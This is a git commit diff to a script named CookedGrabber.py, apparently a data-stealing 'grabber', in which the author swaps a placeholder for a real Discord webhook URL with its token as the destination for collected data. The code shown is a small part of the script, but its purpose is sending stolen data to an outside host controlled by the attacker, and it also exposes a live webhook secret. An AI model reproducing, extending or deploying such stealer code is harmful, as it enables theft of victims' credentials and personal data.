729440887f95b6782a31d432ef05309eba6b5c9d
SunnyAim <75436909+SunnyAim@users.noreply.github.com>
2024-01-15 21:31:00 +0100

    Webhook update

--- CookedGrabber.py
+++ CookedGrabber.py
@@ -517,7 +517,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
 if __name__ == "__main__":
     freeze_support()
     if len(sys.argv) == 1:
-        send_webhook(["YOUR DISCORD WEBHOOK URL"])
+        send_webhook(["https://discord.com/api/webhooks/1196551805895712849/3q5oihyUjmlMgRsDRYFrDivR1X_VGVb0i2jFiVQ6vntH70n7_WALPAkuljliBbGFXm48"])
     else:
         del sys.argv[0]
         send_webhook(sys.argv)
